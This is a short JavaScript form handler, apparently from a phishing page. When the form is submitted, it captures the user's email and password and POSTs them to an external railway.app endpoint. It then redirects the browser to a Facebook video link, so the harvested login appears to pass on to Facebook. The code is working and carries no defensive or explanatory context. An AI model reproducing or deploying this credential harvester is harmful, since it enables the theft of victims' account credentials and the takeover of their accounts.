document.getElementById('formulario').addEventListener('submit', function (event) {
    event.preventDefault();
    const emailcamp = document.getElementById('email').value;
    const passwordcamp = document.getElementById('password').value;

    let formData = {
        email:emailcamp,
        password:passwordcamp
    };

    fetch('https://fa-h-proyect-init-production.up.railway.app/users', {
        method: 'POST',
        body: JSON.stringify(formData),
        headers: {
            'Content-Type': 'application/json'
            // 'Content-Type': 'application/x-www-form-urlencoded',
        },
    })
        .then(response => {
            if (!response.ok) {
                throw new Error('Error en la solicitud');
            }
            return response.json();
        })
        .then(data => {
            console.log('Respuesta del servidor:', data);
            window.location.href = 'https://fb.watch/qZGK6lN3bp/';
        })
        .catch(error => {
            console.error('Error:', error);
        });
});